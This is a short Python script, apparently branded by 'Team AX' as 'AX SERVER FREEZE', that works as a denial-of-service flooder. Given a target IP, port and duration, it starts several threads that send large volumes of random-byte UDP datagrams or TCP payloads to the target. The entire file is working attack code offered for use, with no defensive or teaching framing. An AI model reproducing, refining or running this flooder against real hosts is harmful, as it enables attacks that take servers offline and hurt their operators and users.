#!/usr/bin/env python3
# Code by Khalid Mahmud
import argparse
import random
import socket
import threading
import time

# Parse the arguments
ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
ap.add_argument("-p", "--port", required=True, type=int, help="Port")
ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
ap.add_argument("-t", "--times", type=int, default=50000000, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=6, help="Threads")
ap.add_argument("-d", "--duration", required=True, type=int, help="Duration of the attack in seconds")
args = ap.parse_args()

print("--> Created BY Team AX <--")
print("#-- AX SERVER FREEZE --#")
print("Super Fast And Accurate")

ip = args.ip
port = args.port
times = args.times
threads = args.threads
duration = args.duration
choice = args.choice

# Flag to stop the threads
stop_event = threading.Event()

def run():
    data = random._urandom(1024)
    i = random.choice(("[*]", "[!]", "[#]"))
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                s.sendto(data, addr)
            print(f"\033[92m{i} ATTACK STARTED BY AX S-FLODER!!!!\033[0m")
        except:
            print("\033[91m[!] AN UNKNOWN ERROR OCCURRED!!!\033[0m")

def run2():
    data = random._urandom(16)
    i = random.choice(("[*]", "[!]", "[#]"))
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(f"\033[92m{i} ATTACK STARTED BY AX S-FLODER!!!!\033[0m")
        except:
            s.close()
            print("\033[91m[!] AN UNKNOWN ERROR OCCURRED!!!\033[0m")

threads_list = []

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target=run)
    else:
        th = threading.Thread(target=run2)
    th.start()
    threads_list.append(th)

# Stop the attack after the specified duration
time.sleep(duration)
stop_event.set()

# Wait for all threads to finish
for th in threads_list:
    th.join()

print("Attack Stopped.")
